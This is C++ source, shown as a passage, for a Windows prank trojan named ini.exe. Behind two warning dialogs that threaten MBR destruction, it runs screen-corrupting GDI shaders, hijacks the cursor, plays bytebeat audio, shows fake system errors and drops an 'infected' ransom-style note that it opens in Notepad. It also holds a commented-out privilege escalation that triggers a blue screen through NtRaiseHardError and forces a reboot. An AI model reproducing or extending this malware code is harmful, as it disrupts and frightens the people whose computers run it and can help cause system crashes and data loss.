		BitBlt(hdc, 0, 0, w, h, hdcTemp, 0, 0, SRCERASE);
		SelectObject(hdcTemp, hbmOld);
		DeleteDC(hdcTemp);
		DeleteObject(hbm);
		ReleaseDC(NULL, hdc);
	}
}
DWORD WINAPI icons(LPVOID lpParam)
{
    int signX = 1;
    int signY = 1;
    int signX1 = 1;
    int signY1 = 1;
    int incrementor = 10;
    int x = 10;
    int y = 10;
    while (1)
    {
        HDC hdc = GetDC(0);
        x += incrementor * signX;
        y += incrementor * signY;
        HMODULE hModule = LoadLibrary(TEXT("user32.dll"));
        int randomIcon = rand() % (250 - 50 + 1) + 50;
        HICON hIcon = LoadIcon(hModule, MAKEINTRESOURCE(randomIcon));
        ICONINFO iconInfo;
        GetIconInfo(hIcon, &iconInfo);
        BITMAP bmpIcon;
        GetObject(iconInfo.hbmColor, sizeof(BITMAP), &bmpIcon);
        int iconWidth = bmpIcon.bmWidth;
        int iconHeight = bmpIcon.bmHeight;
        DrawIconEx(hdc, x, y, hIcon, iconWidth * 2, iconHeight * 2, 0, NULL, DI_NORMAL);
        if (y >= GetSystemMetrics(SM_CYSCREEN))
        {
            signY = -1;
        }
        if (x >= GetSystemMetrics(SM_CXSCREEN))
        {
            signX = -1;
        }
        if (y == 0)
        {
            signY = 1;
        }
        if (x == 0)
        {
            signX = 1;
        }
        ReleaseDC(0, hdc);
        Sleep(10);
        FreeLibrary(hModule);
    }
}
DWORD WINAPI shader6(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
				rgbScreen[i].r += 5;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		Sleep(100);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}
DWORD WINAPI plgblt(LPVOID lpParam)
{
	HDC hdc = GetDC(0);
	RECT wRect;
	POINT wPt[3];
	while (1)
	{
		hdc = GetDC(0);
		GetWindowRect(GetDesktopWindow(), &wRect);
		wPt[0].x = wRect.left + 16;
		wPt[0].y = wRect.top - 17;
		wPt[1].x = wRect.right + 16;
		wPt[1].y = wRect.top + 17;
		wPt[2].x = wRect.left - 10;
		wPt[2].y = wRect.bottom + 17;
		PlgBlt(hdc, wPt, hdc, wRect.left, wRect.top, wRect.right + wRect.left, wRect.bottom + wRect.top, 0, 0, 0);
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI shader7(LPVOID lpParam) {
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);
    HDC hdc;
    BITMAPINFO bmp = { 0 };
    PRGBQUAD rgbQuad = { 0 };
        hdc = GetDC(0);
        HDC mdc = CreateCompatibleDC(hdc);
        bmp.bmiHeader.biSize = sizeof(BITMAPINFO);
        bmp.bmiHeader.biBitCount = 32;
        bmp.bmiHeader.biPlanes = 1;
        bmp.bmiHeader.biWidth = w;
        bmp.bmiHeader.biHeight = h;
        HBITMAP hbit = CreateDIBSection(hdc, &bmp, 0, (void**)&rgbQuad, NULL, 0);
        SelectObject(mdc, (HGDIOBJ)hbit);
        for (;;) {
            BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
            for (int re = 0; re < w * h; re++) {
                int x = re % w, y = re / w;
                rgbQuad[re].r += 5;
                rgbQuad[re].g += 5;
                rgbQuad[re].b += 5;
            }
            BitBlt(hdc, 0, 0, w, h, mdc, 0, 0, SRCCOPY);
            Sleep(10);
    }
}
DWORD WINAPI shader8(LPVOID lpvd) { //credits to soheil shahrab, but I modified it
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	INT i = 0;
	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);
		RGBQUAD rgbquadCopy;

		for (int x = 10; x < screenWidth; x++)
		{
			for (int y = 10; y < screenHeight; y++)
			{
				int index = y * screenWidth + x;
				FLOAT fx = (x | y) + (i + i * 10);

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 400.f + y / screenHeight * .1000f, 1000.f);

				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;

		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}

	return 0x00;
}
DWORD WINAPI waves(LPVOID lpParam) //credits to N17Pro3426 for fast sines
{
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	HDC hcdc = CreateCompatibleDC(hdc);
	HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
	SelectObject(hcdc, hBitmap);
	BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
	for (int t = 0; ; t += 20)
	{
		hdc = GetDC(NULL);
		for (int y = 0; y <= h; y++)
		{
			float x = sin((y + t) * (M_PI / 50)) * 25;
			BitBlt(hdc, x, y, w, 1, hcdc, 0, y, SRCCOPY);
		}
		ReleaseDC(NULL, hdc);
		DeleteObject(hdc);
	}
	Sleep(10);
	ReleaseDC(NULL, hcdc);
	DeleteObject(hcdc);
	DeleteObject(hBitmap);
	return 0;
}
DWORD WINAPI shader9(LPVOID lpvd) { //credits to soheil shahrab, but I modified it
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	INT i = 0;
	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);
		RGBQUAD rgbquadCopy;

		for (int x = 0; x < screenWidth; x++)
		{
			for (int y = 0; y < screenHeight; y++)
			{
				int index = y * screenWidth + x;
				FLOAT fx = (225) + (i + i * 10);

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 400.f + y / screenHeight * .10f, 1.f);

				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;

		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}

	return 0x00;
}
DWORD WINAPI lines(LPVOID lpParam)
{
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);
	while (1)
	{
		HDC hdc = GetDC(HWND_DESKTOP);
		HBRUSH brush = CreateSolidBrush(Hue(239));
		SelectObject(hdc, brush);
		LineTo(hdc, rand() % (0 - w), 0);
		LineTo(hdc, rand() % (0 - w), h);
		Sleep(10);
		DeleteObject(brush);
		ReleaseDC(NULL, hdc);
	}
}
DWORD WINAPI cur(LPVOID lpParam) {
	while (1) {
		INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
		int X = rand() % w;
		int Y = rand() % h;
		SetCursorPos(X, Y);
		Sleep(1);
	}
}
DWORD WINAPI last(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].rgb = (rand() % 0x100) * 0x010101;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}
VOID WINAPI sound1() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t | (t >> 8 | t >> 2)) * t & (t >> 12 | t >> 10));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound2() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(9 * t & t >> 4 | 5 * t & t >> 70 | (3 * t & t >> 200) - 1);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound3() { //credits to N17Pro3426
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[32000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t & t >> 7) + (t | t >> 7) + (t | t >> 7) + (t | t >> 7) & t >> 7);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound4() { //credits to N17Pro3426
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		if (-t !=0)buffer[t] = static_cast<char>(((t + 16) & t >> 7) + t / 32768 / -t | t * t << 8 | t / t * t);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound5() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		if (-t != 0) buffer[t] = static_cast<char>((2 * t & 277777) * (t >> 6 & 257) >> 8);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound6() { //credits to N17Pro3426
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t & t >> 1) + (t | t >> 5) + (t | t >> 15) + (t | t >> 1) & t >> 2);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound7() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 10000, 10000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[10000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t ^ t >> 1) + (t | t >> 5));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound8() { // credits to kapi2.0peys but i modded it
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8100, 8100, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8100 * 60] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t ^ t + t * (t >> 11 | t >> 3) + t));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound9() { // credits to kapi2.0peys but i modded it
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8100, 8100, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8100 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t ^ t + t * (t >> 11 | t >> 11) + t));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
DWORD WINAPI fakeerror(LPVOID lpParam) {
	MessageBox(NULL, "The procedure entry point URL could not be located in the dynamic link library url.dll.", "Windows - Entry Point Not Found", MB_ICONERROR); //Deltarune Reference when you run a new version on Windows 7 lmao
	return 0;
}
DWORD WINAPI notepad(LPVOID lpParam) {
	MessageBox(NULL, "Your Computer has been infected by the ini.exe trojan! Enjoy the hell being casted to your data and operating system!", "ini.exe", MB_ICONERROR); //fallback msgbox
	return 0;
}
DWORD WINAPI notepad2(LPVOID lpParam)
{
	const CHAR note[] = "Your Computer has been infected by the ini.exe trojan! Enjoy the hell being casted to your data and operating system!";
	CreateDirectoryA("C:\\ini", 0);
	HANDLE hCreateNote = CreateFileW((LPCWSTR)L"C:\\ini\\note.txt", GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hCreateNote != INVALID_HANDLE_VALUE)
	{
		DWORD word;
		if (note == INVALID_HANDLE_VALUE) {
			MessageBoxW(NULL, L"Your Computer has been infected by the ini.exe trojan! Enjoy the hell being casted to your data and operating system!", L"ini.exe", MB_ICONERROR); //fallback msgbox
			Sleep(-1);
		}
			//ExitProcess(4);
		if (!WriteFile(hCreateNote, note, lstrlenA(note), &word, NULL)) {
			MessageBoxW(NULL, L"Your Computer has been infected by the ini.exe trojan! Enjoy the hell being casted to your data and operating system!", L"ini.exe", MB_ICONERROR); //fallback msgbox
			Sleep(-1);
		}
			//ExitProcess(5);
		CloseHandle(hCreateNote);
		ShellExecuteA(NULL, NULL, "notepad", "C:\\ini\\note.txt", NULL, SW_SHOWDEFAULT);
	}
	return 0;
}

int CALLBACK WinMain(
	HINSTANCE hInstance, HINSTANCE hPrevInstance,
	LPSTR     lpCmdLine, int       nCmdShow
)
{
	if (MessageBoxW(NULL, L"You are about to run the ini Trojan horse that will overwrite your MBR and make this device unusable.\r\nIf you are seeing this message without knowing what you just executed, just hit No and nothing will happen.\r\nBut, If you are taking a risk, or running it on a virtual machine, hit Yes.\n\nIf you are running this on real hardware, Close the program and delete this file quickly! Venra is not responsible for any damages to your device. Or any removal of this disclaimer!!\r\nProceed with running?\n\nDiscord: friesandlettuce", L"GDI-Trojan.Win32-ini.exe - Warning #1", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
	{
		ExitProcess(0);
	}
	else
	{
		if (MessageBoxW(NULL, L"This is your final chance.\n\nAfter you run the program the system will be destroyed!\n\nStill proceed?", L"GDI-Trojan.Win32-ini - Warning #2", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
		{
			ExitProcess(0);
		}
		else
		{
			Sleep(5000);
			CreateThread(0, 0, fakeerror, 0, 0, 0);
			Sleep(5000);
			CreateThread(0, 0, notepad, 0, 0, 0);
			CreateThread(0, 0, notepad2, 0, 0, 0);
			Sleep(5000);
			HANDLE thread1 = CreateThread(0, 0, shader1, 0, 0, 0);
			HANDLE thread1dot1 = CreateThread(0, 0, balls, 0, 0, 0);
			sound1();
			Sleep(30000);
			TerminateThread(thread1, 0);
			CloseHandle(thread1);
			InvalidateRect(0, 0, 0);
			HANDLE thread2 = CreateThread(0, 0, shader2, 0, 0, 0);
			sound2();
			Sleep(30000);
			TerminateThread(thread2, 0);
			CloseHandle(thread2);
			InvalidateRect(0, 0, 0);
			HANDLE thread3 = CreateThread(0, 0, train, 0, 0, 0);
			sound3();
			Sleep(30000);
			TerminateThread(thread3, 0);
			CloseHandle(thread3);
			InvalidateRect(0, 0, 0);
			HANDLE thread4 = CreateThread(0, 0, shader3, 0, 0, 0); 
			sound4();
			Sleep(30000);
			TerminateThread(thread4, 0);
			CloseHandle(thread4);
			InvalidateRect(0, 0, 0);
			HANDLE thread5 = CreateThread(0, 0, shader4, 0, 0, 0);
			sound5();
			Sleep(30000);
			TerminateThread(thread5, 0);
			CloseHandle(thread5);
			InvalidateRect(0, 0, 0);
			HANDLE thread6 = CreateThread(0, 0, shader5, 0, 0, 0);
			HANDLE thread6dot1 = CreateThread(0, 0, cube, 0, 0, 0);
			sound6();
			Sleep(30000);
			TerminateThread(thread6, 0);
			CloseHandle(thread6);
			InvalidateRect(0, 0, 0);
			HANDLE thread7 = CreateThread(0, 0, colorfx, 0, 0, 0);
			HANDLE thread7dot1 = CreateThread(0, 0, icons, 0, 0, 0);
			sound7();
			Sleep(30000);
			TerminateThread(thread7, 0);
			CloseHandle(thread7);
			InvalidateRect(0, 0, 0);	
			HANDLE thread8 = CreateThread(0, 0, shader6, 0, 0, 0);
			sound8();
			Sleep(30000);
			TerminateThread(thread8, 0);
			CloseHandle(thread8);
			InvalidateRect(0, 0, 0);
			HANDLE thread9 = CreateThread(0, 0, shader7, 0, 0, 0);
			HANDLE thread9dot1 = CreateThread(0, 0, plgblt, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread9, 0);
			TerminateThread(thread9dot1, 0);
			CloseHandle(thread9);
			CloseHandle(thread9dot1);
			InvalidateRect(0, 0, 0);
			HANDLE thread10 = CreateThread(0, 0, shader8, 0, 0, 0);
		        sound9();
			Sleep(5000);
			HANDLE thread10dot1 = CreateThread(0, 0, waves, 0, 0, 0);
			Sleep(25000);
			TerminateThread(thread10, 0);
			CloseHandle(thread10);
			TerminateThread(thread10dot1, 0);
			CloseHandle(thread10dot1);
			TerminateThread(thread1dot1, 0);
			CloseHandle(thread1dot1);
			TerminateThread(thread6dot1, 0);
			CloseHandle(thread6dot1);
			TerminateThread(thread7dot1, 0);
			CloseHandle(thread7dot1);
			Sleep(10000);
			HANDLE thread11 = CreateThread(0, 0, shader9, 0, 0, 0);
			HANDLE thread11dot1 = CreateThread(0, 0, cur, 0, 0, 0);
			HANDLE thread11dot2 = CreateThread(0, 0, lines, 0, 0, 0);
			sound7();
			Sleep(30000);
			HANDLE finale = CreateThread(0, 0, last, 0, 0, 0);
			Sleep(3000);
			/*SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS); //Max priority class
			BOOLEAN bl;
			DWORD response;
	                NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
	                RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
	                RtlAdjustPrivilege(19, 1, 0, &bl);
	                NtRaiseHardError(0xC0000001 + Random() % 0x38e, 0, 0, 0, 6, &response); //Trigger BSoD

	                // If the computer is still running, do it the normal way
	                HANDLE token;
	                TOKEN_PRIVILEGES privileges;

	                OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token);

	                LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &privileges.Privileges[0].Luid);
	                privileges.PrivilegeCount = 1;
	                privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	                AdjustTokenPrivileges(token, FALSE, &privileges, 0, (PTOKEN_PRIVILEGES)NULL, 0);

        	        // The actual restart
        	        ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_DISK);
        	        Sleep(-1);*/
		}
	}
}
